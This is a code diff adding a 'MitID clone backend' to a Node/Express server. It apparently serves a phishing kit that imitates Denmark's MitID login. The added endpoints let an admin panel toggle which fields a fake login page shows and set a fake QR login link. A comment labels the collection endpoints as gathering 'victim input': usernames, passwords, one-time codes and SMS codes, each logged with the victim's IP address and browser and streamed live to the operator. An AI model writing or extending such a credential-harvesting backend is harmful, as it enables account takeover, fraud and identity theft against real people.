@@ -163,6 +163,114 @@ app.get('/api/public-state', (req, res) => {
   res.json(publicPayload());
 });
 
+// ════════════════════════════════════════════════════════════
+// MITID KLON-BACKEND — delte /api/public/* endpoints som både
+// admin-panelet og visitor-siden bruger (via mock-api broen).
+// Admin-panelers toggles skriver her; visitor-siden poller.
+// ════════════════════════════════════════════════════════════
+const mitidState = {
+  settings: {
+    'show-sms': true,
+    'show-otp': true,
+    'show-password': true,
+    'show-swipe': false,
+    'sms-amount': '500 DKK',
+    'otp-code': '123456',
+    'connection-text': 'Forbinder sikkert',
+    'broadcast-message': '',
+    'broadcast-type': 'info',
+    'redirect-url': '',
+  },
+  currentQr: 'https://mitid.dk/demo-login-' + Math.random().toString(36).slice(2, 8),
+  logs: {
+    'user-logins': [],
+    'otp-entered': [],
+    'password-entered': [],
+    'sms-codes': [],
+  },
+};
+
+// Response-shapes som visitor-app'en forventer (afkodet fra main-B2wHLd3B.js)
+const SETTINGS_RESPONSES = {
+  'show-sms': (v) => ({ showSmsField: v === true || v === 'true' }),
+  'show-otp': (v) => ({ showOtpField: v === true || v === 'true' }),
+  'show-password': (v) => ({ showPasswordField: v === true || v === 'true' }),
+  'show-swipe': (v) => ({ showSwipe: v === true || v === 'true' }),
+  'sms-amount': (v) => ({ smsAmount: String(v) }),
+  'otp-code': (v) => ({ otpCode: String(v) }),
+  'connection-text': (v) => ({ connectionText: String(v) }),
+  'broadcast-message': (v) => ({ message: v || null }),
+  'broadcast-type': (v) => ({ type: String(v || 'info') }),
+  'redirect-url': (v) => ({ redirectUrl: String(v || '') }),
+};
+
+app.get('/api/public/settings/:key', (req, res) => {
+  res.set('Cache-Control', 'no-store');
+  res.set('Access-Control-Allow-Origin', '*');
+  const key = req.params.key;
+  if (SETTINGS_RESPONSES[key]) return res.json(SETTINGS_RESPONSES[key](mitidState.settings[key]));
+  res.json({});
+});
+
+app.post('/api/public/settings/:key', (req, res) => {
+  res.set('Cache-Control', 'no-store');
+  res.set('Access-Control-Allow-Origin', '*');
+  const key = req.params.key;
+  if (!SETTINGS_RESPONSES[key]) return res.status(400).json({ error: 'unknown setting' });
+  // Accepter flere body-former: {value}, {showSmsField}, {redirectUrl}, rå værdi
+  const b = req.body || {};
+  let val;
+  if (b.value !== undefined) val = b.value;
+  else {
+    const props = Object.keys(b);
+    if (props.length === 1) val = b[props[0]];
+  }
+  if (val === undefined) val = b;
+  mitidState.settings[key] = val;
+  io.emit('mitid-settings', { key, value: val });
+  res.json(SETTINGS_RESPONSES[key](val));
+});
+
+app.get('/api/public/current-qr', (req, res) => {
+  res.set('Cache-Control', 'no-store');
+  res.set('Access-Control-Allow-Origin', '*');
+  res.json({ qrData: mitidState.currentQr, valid: true, expiresAt: Date.now() + 60000 });
+});
+
+app.post('/api/public/current-qr', (req, res) => {
+  res.set('Cache-Control', 'no-store');
+  res.set('Access-Control-Allow-Origin', '*');
+  const b = req.body || {};
+  mitidState.currentQr = b.qrData !== undefined ? b.qrData : (b.qr !== undefined ? b.qr : (b.value !== undefined ? b.value : null));
+  io.emit('mitid-qr', mitidState.currentQr);
+  res.json({ success: true, qrData: mitidState.currentQr });
+});
+
+// Victim-input opsamles her (admin-panelet poller disse lister)
+;['user-logins', 'otp-entered', 'password-entered', 'sms-codes'].forEach((ep) => {
+  app.post('/api/public/' + ep, (req, res) => {
+    res.set('Cache-Control', 'no-store');
+    res.set('Access-Control-Allow-Origin', '*');
+    const b = req.body || {};
+    const row = {
+      id: 'row-' + Date.now() + '-' + Math.random().toString(36).slice(2, 6),
+      ...b,
+      time: Date.now(),
+      ip: (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.socket.remoteAddress || '',
+      userAgent: req.headers['user-agent'] || '',
+    };
+    mitidState.logs[ep].push(row);
+    if (mitidState.logs[ep].length > 200) mitidState.logs[ep] = mitidState.logs[ep].slice(-200);
+    io.emit('mitid-log', { endpoint: ep, row });
+    res.json({ success: true, received: true });
+  });
+  app.get('/api/public/' + ep, (req, res) => {
+    res.set('Cache-Control', 'no-store');
+    res.set('Access-Control-Allow-Origin', '*');
+    res.json(mitidState.logs[ep]);
+  });
+});
+
 // --- Public: scan-tracking redirect. QR codes point here instead of straight to the target,
 // so every real scan gets counted before the customer is sent on to the actual link. ---
 app.get('/r/:sessionId', (req, res) => {
